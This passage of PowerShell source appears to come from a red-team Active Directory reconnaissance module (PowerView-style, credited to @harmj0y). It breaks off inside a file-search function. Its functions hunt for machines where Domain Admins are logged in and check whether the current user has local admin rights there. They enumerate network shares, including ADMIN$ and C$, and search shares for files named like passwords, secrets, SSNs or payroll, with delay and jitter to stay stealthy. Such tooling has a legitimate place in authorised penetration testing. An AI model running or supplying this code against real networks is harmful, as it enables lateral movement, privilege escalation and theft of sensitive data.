            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server array
    $servers = Get-ShuffledArray $servers
    
    # if we get a specific username, only use that
    if ($UserName){
        "`r`n[*] Using target user '$UserName'..."
        $TargetUsers += $UserName.ToLower()
    }
    # get the users from a particular OU if one is specified
    elseif($OU){
        $TargetUsers = Get-NetUsers -OU $OU | ForEach-Object {$_.samaccountname}
    }
    # use a specific LDAP query string to query for users
    elseif($LDAPquery){
        $TargetUsers = Get-NetUsers -LDAPquery $LDAPquery | ForEach-Object {$_.samaccountname}
    }
    # read in a target user list if we have one
    elseif($UserList){
        $TargetUsers = @()
        # make sure the list exists
        if (Test-Path -Path $UserList){
            $TargetUsers = Get-Content -Path $UserList 
        }
        else {
            Write-Warning "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
            "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
            return
        }
    }
    else{
        # otherwise default to the group name to query for target users
        "`r`n[*] Querying domain group '$GroupName' for target users..."
        $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain
        # lower case all of the found usernames
        $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
    }
    
    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "`r`n[!] No users found to search for!"
        "`r`n[!] No users found to search for!"
        return $Null
    }
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
         "`r`n[!] No hosts found!"
        return $Null
    }

    # script block that eunmerates a server
    # this is called by the multi-threading code later
    $EnumServerBlock = {
        param($Server, $Ping, $TargetUsers, $CurrentUser, $CurrentUserBase)

        # optionally check if the server is up first
        $up = $true
        if($Ping){
            $up = Test-Server -Server $Server
        }
        if($up){
            # get active sessions and see if there's a target user there
            $sessions = Get-NetSessions -HostName $Server

            foreach ($session in $sessions) {
                $username = $session.sesi10_username
                $cname = $session.sesi10_cname
                $activetime = $session.sesi10_time
                $idletime = $session.sesi10_idle_time
                
                # make sure we have a result
                if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $CurrentUserBase)){
                    # if the session user is in the target list, display some output
                    if ($TargetUsers -contains $username){
                        $ip = Get-HostIP -hostname $Server
                        "[+] Target user '$username' has a session on $Server ($ip) from $cname"
                        
                        # see if we're checking to see if we have local admin access on this machine
                        if ($CheckAccess){
                            if (Invoke-CheckLocalAdminAccess -Hostname $cname){
                                "[+] Current user '$CurrentUser' has local admin access on $cname !"
                            }
                        }
                    }
                }
            }
            
            # get any logged on users and see if there's a target user there
            $users = Get-NetLoggedon -HostName $Server
            foreach ($user in $users) {
                $username = $user.wkui1_username
                $domain = $user.wkui1_logon_domain
                
                if (($username -ne $null) -and ($username.trim() -ne '')){
                    # if the session user is in the target list, display some output
                    if ($TargetUsers -contains $username){
                        $ip = Get-HostIP -hostname $server
                        # see if we're checking to see if we have local admin access on this machine
                        "[+] Target user '$username' logged into $Server ($ip)"
                        
                        # see if we're checking to see if we have local admin access on this machine
                        if ($CheckAccess){
                            if (Invoke-CheckLocalAdminAccess -Hostname $ip){
                                "[+] Current user '$CurrentUser' has local admin access on $ip !"
                            }
                        }
                    }
                }
            }
        }
    }

    # Adapted from:
    #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
    # grab all the current variables for this runspace
    $MyVars = Get-Variable -Scope 1
 
    # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
    # Add Variables from Parent Scope (current runspace) into the InitialSessionState 
    ForEach($Var in $MyVars) {
        If($VorbiddenVars -notcontains $Var.Name) {
        $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    # Add Functions from current runspace to the InitialSessionState
    ForEach($Function in (Get-ChildItem Function:)) {
        $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
    }
 

    # threading adapted from
    # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
    # Thanks Carlos!   
    $counter = 0

    # create a pool of maxThread runspaces   
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()   
    $ps = @()   
    $wait = @()

    $serverCount = $servers.count
    "`r`n[*] Enumerating $serverCount servers..."

    foreach ($server in $servers){
        
        # make sure we get a server name
        if ($server -ne ''){
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            While ($($pool.GetAvailableRunspaces()) -le 0) {
                Start-Sleep -milliseconds 500
            }
    
            # create a "powershell pipeline runner"   
            $ps += [powershell]::create()
   
            $ps[$counter].runspacepool = $pool

            # add the script block + arguments
            [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('TargetUsers', $TargetUsers).AddParameter('CurrentUser', $CurrentUser).AddParameter('CurrentUserBase', $CurrentUserBase)
    
            # start job
            $jobs += $ps[$counter].BeginInvoke();
     
            # store wait handles for WaitForAll call   
            $wait += $jobs[$counter].AsyncWaitHandle

        }
        $counter = $counter + 1
    }

    Write-Verbose "Waiting for scanning threads to finish..."

    $waitTimeout = Get-Date

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
            Start-Sleep -milliseconds 500
        } 

    # end async call   
    for ($y = 0; $y -lt $counter; $y++) {     

        try {   
            # complete async job   
            $ps[$y].EndInvoke($jobs[$y])   

        } catch {
            Write-Warning "error: $_"  
        }
        finally {
            $ps[$y].Dispose()
        }    
    }

    $pool.Dispose()
}


function Invoke-StealthUserHunter {
    <#
        .SYNOPSIS
        Finds where users are logged into by checking the net sessions
        on common file servers (default) or through SPN records (-SPN).

        Author: @harmj0y
        
        .DESCRIPTION
        This function issues one query on the domain to get users of a target group,
        issues one query on the domain to get all user information, extracts the 
        homeDirectory for each user, creates a unique list of servers used for 
        homeDirectories (i.e. file servers), and runs Get-NetSessions against the target 
        servers. Found users are compared against the users queried from the domain group,
        or pulled from a pre-populated user list. Significantly less traffic is generated 
        on average compared to Invoke-UserHunter, but not as many hosts are covered.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        OU to query for target users.

        .PARAMETER LDAPquery
        The complete LDAP query string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER SPN
        Use SPN records to get your target sets.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER HostList
        List of servers to enumerate.

        .PARAMETER Shuffle
        Shuffle the file server list before before enumerating.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating fileservers, defaults to 0

        .PARAMETER Jitter
        Jitter for the fileserver delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for users file server locations.

        .EXAMPLE
        > Invoke-StealthUserHunter
        Finds machines on the local domain where domain admins have sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -Domain testing
        Finds machines on the 'testing' domain where domain admins have sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -UserList users.txt
        Finds machines on the local domain where users from a specified list have
        sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -CheckAccess
        Finds machines on the local domain where domain admins have sessions from
        and checks if the current user has local administrator access to those 
        found machines.

        .EXAMPLE
        > Invoke-StealthUserHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups  
        have sessions with a 60 second (+/- *.3) randomized delay between 
        touching each file server.

        .LINK
        http://blog.harmj0y.net
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $LDAPquery,

        [string]
        $UserName,

        [Switch]
        $SPN,

        [Switch]
        $CheckAccess,

        [Switch]
        $Ping,

        [Switch]
        $NoPing,

        [Switch]
        $Shuffle,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $HostList,

        [string]
        $UserList,

        [string]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # users we're going to be searching for
    $TargetUsers = @()
    
    # resulting servers to query
    $Servers = @()
    
    # random object for delay
    $randNo = New-Object System.Random
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    $CurrentUserBase = ([Environment]::UserName)
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    "`r`n[*] Running StealthUserHunter on domain $targetDomain with delay of $Delay"
    
    # if we get a specific username, only use that
    if ($UserName){
        "`r`n[*] Using target user '$UserName'..."
        $TargetUsers += $UserName.ToLower()
    }
    # get the users from a particular OU if one is specified
    elseif($OU){
        $TargetUsers = Get-NetUsers -OU $OU | ForEach-Object {$_.samaccountname}
    }
    # use a specific LDAP query string to query for users
    elseif($LDAPquery){
        $TargetUsers = Get-NetUsers -LDAPquery $LDAPquery | ForEach-Object {$_.samaccountname}
    }
    # read in a target user list if we have one
    elseif($UserList){
        $TargetUsers = @()
        # make sure the list exists
        if (Test-Path -Path $UserList){
            $TargetUsers = Get-Content -Path $UserList 
        }
        else {
            Write-Warning "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
            "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
            return
        }
    }
    else{
        # otherwise default to the group name to query for target users
        "`r`n[*] Querying domain group '$GroupName' for target users..."
        $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain
        # lower case all of the found usernames
        $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
    }
    
    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "`r`n[!] No users found to search for!"
        "`r`n[!] No users found to search for!"
        return
    }

    $servers = @()

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return
        }
    }
    else{
        # check if we're using the SPN method
        if($SPN){
            # set the unique set of SPNs from user objects
            $Servers = Get-NetUserSPNs | Foreach-Object {
                $_.ServicePrincipalName | Foreach-Object {
                    ($_.split("/")[1]).split(":")[0]
                }
            } | Sort-Object | Get-Unique
        }
        else{
            # get the file server list
            [Array]$Servers  = Get-NetFileServers -Domain $targetDomain
        }
    }

    "[*] Found $($Servers.count) servers`n"
    
    # randomize the fileserver array if specified
    if ($shuffle){
        [Array]$Servers = Get-ShuffledArray $Servers
    }
    
    # error checking
    if (($Servers -eq $null) -or ($Servers.count -eq 0)){
        "`r`n[!] No fileservers found in user home directories!"
        return
    }
    else{
        
        $n = $Servers.count

        $counter = 0
        
        # iterate through each target file server
        foreach ($server in $Servers){
            
            $counter = $counter + 1
            
            Write-Verbose "[*] Enumerating file server $server ($counter of $($Servers.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            
            # optionally check if the server is up first
            $up = $true
            if(-not $NoPing){
                $up = Test-Server -Server $server
            }
            if ($up){
                # grab all the sessions for this fileserver
                $sessions = Get-NetSessions $server
                
                # search through all the sessions for a target user
                foreach ($session in $sessions) {
                    Write-Debug "[*] Session: $session"
                    # extract fields we care about
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time
                    
                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            "[+] Target user '$username' has a session on $server ($ip) from $cname"
                            
                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                                if (Invoke-CheckLocalAdminAccess -Hostname $server){
                                    "[+] Current user '$CurrentUser' has local admin access on $server !"
                                }
                                if (Invoke-CheckLocalAdminAccess -Hostname $cname){
                                    "[+] Current user '$CurrentUser' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


function Invoke-ShareFinder {
    <#
        .SYNOPSIS
        Finds (non-standard) shares on machines in the domain.

        Author: @harmj0y
        
        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for 
        each server it lists of active shares with Get-NetShare. Non-standard shares 
        can be filtered out with -Exclude* flags.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludeStandard
        Exclude standard shares from display (C$, IPC$, print$ etc.)

        .PARAMETER ExcludePrint
        Exclude the print$ share

        .PARAMETER ExcludeIPC
        Exclude the IPC$ share

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER CheckAdmin
        Only display ADMIN$ shares the local user has access to.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines.

        .EXAMPLE
        > Invoke-ShareFinder
        Find shares on the domain.
        
        .EXAMPLE
        > Invoke-ShareFinder -ExcludeStandard
        Find non-standard shares on the domain.

        .EXAMPLE
        > Invoke-ShareFinder -Delay 60
        Find shares on the domain with a 60 second (+/- *.3) 
        randomized delay between touching each host.

        .EXAMPLE
        > Invoke-ShareFinder -HostList hosts.txt
        Find shares for machines in the specified hostlist.

        .LINK
        http://blog.harmj0y.net
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $Ping,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # figure out the shares we want to ignore
    [String[]] $excludedShares = @('')
    
    if ($ExcludePrint){
        $excludedShares = $excludedShares + "PRINT$"
    }
    if ($ExcludeIPC){
        $excludedShares = $excludedShares + "IPC$"
    }
    if ($ExcludeStandard){
        $excludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
    }
    
    # random object for delay
    $randNo = New-Object System.Random
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running ShareFinder on domain $targetDomain with delay of $Delay"
    $servers = @()

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list
    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }
    else{
        
        # return/output the current status lines
        $counter = 0
        
        foreach ($server in $servers){
            
            $counter = $counter + 1
            
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
            
            if ($server -ne ''){
                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                
                # optionally check if the server is up first
                $up = $true
                if(-not $NoPing){
                    $up = Test-Server -Server $server
                }
                if($up){
                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Debug "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = '\\'+$server+'\'+$netname

                        # make sure we get a real share name back
                        if (($netname) -and ($netname.trim() -ne '')){
                            
                            # if we're just checking for access to ADMIN$
                            if($CheckAdmin){
                                if($netname.ToUpper() -eq "ADMIN$"){
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "\\$server\$netname `t- $remark"
                                    }
                                    catch {}
                                }
                            }
                            
                            # skip this share if it's in the exclude list
                            elseif ($excludedShares -notcontains $netname.ToUpper()){
                                # see if we want to check access to this share
                                if($CheckShareAccess){
                                    # check if the user has access to this path
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "\\$server\$netname `t- $remark"
                                    }
                                    catch {}
                                }
                                else{
                                    "\\$server\$netname `t- $remark"
                                }
                            } 
                            
                        }
                        
                    }
                }
                
            }
            
        }
    }
}


function Invoke-ShareFinderThreaded {
    <#
        .SYNOPSIS
        Finds (non-standard) shares on machines in the domain.
        Threaded version of Invoke-ShareFinder.
        Author: @harmj0y
        
        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for 
        each server it lists of active shares with Get-NetShare. Non-standard shares 
        can be filtered out with -Exclude* flags.
        Threaded version of Invoke-ShareFinder.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludedShares
        Shares to exclude from output, wildcards accepted (i.e. IPC*)

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER CheckAdmin
        Only display ADMIN$ shares the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-ShareFinder
        Find shares on the domain.
        
        .EXAMPLE
        > Invoke-ShareFinder -ExcludedShares IPC$,PRINT$
        Find shares on the domain excluding IPC$ and PRINT$

        .EXAMPLE
        > Invoke-ShareFinder -HostList hosts.txt
        Find shares for machines in the specified hostlist.

        .LINK
        http://blog.harmj0y.net
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [string[]]
        $ExcludedShares = @(),

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [String]
        $Domain,

        [Int]
        $MaxThreads = 10
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running Invoke-ShareFinderThreaded on domain $targetDomain with delay of $Delay"
    $servers = @()

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list
    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }

    # script block that eunmerates a server
    # this is called by the multi-threading code later
    $EnumServerBlock = {
        param($Server, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)

        # optionally check if the server is up first
        $up = $true
        if($Ping){
            $up = Test-Server -Server $Server
        }
        if($up){
            # get the shares for this host and check what we find
            $shares = Get-NetShare -HostName $Server
            foreach ($share in $shares) {
                Write-Debug "[*] Server share: $share"
                $netname = $share.shi1_netname
                $remark = $share.shi1_remark
                $path = '\\'+$server+'\'+$netname

                # make sure we get a real share name back
                if (($netname) -and ($netname.trim() -ne '')){
                    # if we're just checking for access to ADMIN$
                    if($CheckAdmin){
                        if($netname.ToUpper() -eq "ADMIN$"){
                            try{
                                $f=[IO.Directory]::GetFiles($path)
                                "\\$server\$netname `t- $remark"
                            }
                            catch {}
                        }
                    }
                    # skip this share if it's in the exclude list
                    elseif ($excludedShares -notcontains $netname.ToUpper()){
                        # see if we want to check access to this share
                        if($CheckShareAccess){
                            # check if the user has access to this path
                            try{
                                $f=[IO.Directory]::GetFiles($path)
                                "\\$server\$netname `t- $remark"
                            }
                            catch {}
                        }
                        else{
                            "\\$server\$netname `t- $remark"
                        }
                    } 
                }
            }
        }
    }

    # Adapted from:
    #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
    # grab all the current variables for this runspace
    $MyVars = Get-Variable -Scope 1
 
    # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
    # Add Variables from Parent Scope (current runspace) into the InitialSessionState 
    ForEach($Var in $MyVars) {
        If($VorbiddenVars -notcontains $Var.Name) {
        $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    # Add Functions from current runspace to the InitialSessionState
    ForEach($Function in (Get-ChildItem Function:)) {
        $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
    }
 
    # threading adapted from
    # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
    # Thanks Carlos!   
    $counter = 0

    # create a pool of maxThread runspaces   
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()   
    $ps = @()   
    $wait = @()

    $serverCount = $servers.count
    "`r`n[*] Enumerating $serverCount servers..."

    foreach ($server in $servers){
        
        # make sure we get a server name
        if ($server -ne ''){
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            While ($($pool.GetAvailableRunspaces()) -le 0) {
                Start-Sleep -milliseconds 500
            }
    
            # create a "powershell pipeline runner"   
            $ps += [powershell]::create()
   
            $ps[$counter].runspacepool = $pool

            # add the script block + arguments
            [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CheckShareAccess', $CheckShareAccess).AddParameter('ExcludedShares', $ExcludedShares).AddParameter('CheckAdmin', $CheckAdmin)
    
            # start job
            $jobs += $ps[$counter].BeginInvoke();
     
            # store wait handles for WaitForAll call   
            $wait += $jobs[$counter].AsyncWaitHandle

        }
        $counter = $counter + 1
    }

    Write-Verbose "Waiting for scanning threads to finish..."

    $waitTimeout = Get-Date

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
            Start-Sleep -milliseconds 500
        } 

    # end async call   
    for ($y = 0; $y -lt $counter; $y++) {     

        try {   
            # complete async job   
            $ps[$y].EndInvoke($jobs[$y])   

        } catch {
            Write-Warning "error: $_"  
        }
        finally {
            $ps[$y].Dispose()
        }    
    }

    $pool.Dispose()
}


function Invoke-FileFinder {
    <#
        .SYNOPSIS
        Finds sensitive files on the domain.

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ShareList
        List if \\HOST\shares to search through.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER IncludeC
        Include any C$ shares in recursive searching (default ignore).

        .PARAMETER IncludeAdmin
        Include any ADMIN$ shares in recursive searching (default ignore).

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FileFinder
        Find readable files on the domain with 'pass', 'sensitive', 
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,
        
        .EXAMPLE
        > Invoke-FileFinder -Domain testing
        Find readable files on the 'testing' domain with 'pass', 'sensitive', 
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,
        
        .EXAMPLE
        > Invoke-FileFinder -IncludeC 
        Find readable files on the domain with 'pass', 'sensitive', 
        'secret', 'admin', 'login' or 'unattend*.xml' in the name, 
        including C$ shares.

        .EXAMPLE
        > Invoke-FileFinder -Ping -Terms payroll,ceo
        Find readable files on the domain with 'payroll' or 'ceo' in
        the filename and ping each machine before share enumeration.

        .EXAMPLE
        > Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv
        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name, and write everything to "out.csv"

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $ShareList,
        
        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,
        
        [string[]]
        $Terms,
        
        [string]
        $AccessDateLimit = '1/1/1970',
        
        [string]
        $WriteDateLimit = '1/1/1970',
        
        [string]
        $CreateDateLimit = '1/1/1970',
        
        [Switch] 
        $IncludeC,
        
        [Switch] 
        $IncludeAdmin,
        
        [Switch] 
        $ExcludeFolders,
        
        [Switch] 
        $ExcludeHidden,
        
        [Switch] 
        $CheckWriteAccess,
        
        [string] 
        $OutFile,
        
        [Switch]
        $Ping,

        [Switch]
        $NoPing,
        
        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # figure out the shares we want to ignore
    [String[]] $excludedShares = @("C$", "ADMIN$")
    
    # see if we're specifically including any of the normally excluded sets
    if ($IncludeC){
        if ($IncludeAdmin){
            $excludedShares = @()
        }
        else{
            $excludedShares = @("ADMIN$")
        }
    }

    if ($IncludeAdmin){
        if ($IncludeC){
            $excludedShares = @()
        }
        else{
            $excludedShares = @("C$")
        }
    }
    
    # delete any existing output file if it already exists
    If ($OutFile -and (Test-Path -Path $OutFile)){ Remove-Item -Path $OutFile }
    
    # if we are passed a share list, enumerate each with appropriate options, then return
    if($ShareList){
        if (Test-Path -Path $ShareList){
            foreach ($Item in Get-Content -Path $ShareList) {
                if (($Item -ne $null) -and ($Item.trim() -ne '')){
                    
                    # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                    $share = $Item.Split("`t")[0]
                    
                    # get just the share name from the full path
                    $shareName = $share.split('\')[3]
                    
